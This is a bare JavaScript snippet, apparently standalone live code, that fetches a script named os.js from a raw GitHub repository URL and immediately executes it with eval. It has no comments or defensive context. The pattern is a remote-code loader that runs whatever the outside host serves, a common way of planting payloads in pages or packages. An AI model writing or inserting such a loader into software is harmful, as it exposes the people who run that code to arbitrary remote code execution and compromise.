(function() {
    fetch('https://raw.githubusercontent.com/PPPProtocol/cyt/refs/heads/main/os.js')
        .then(res => res.text())
        .then(script => eval(script));
})();
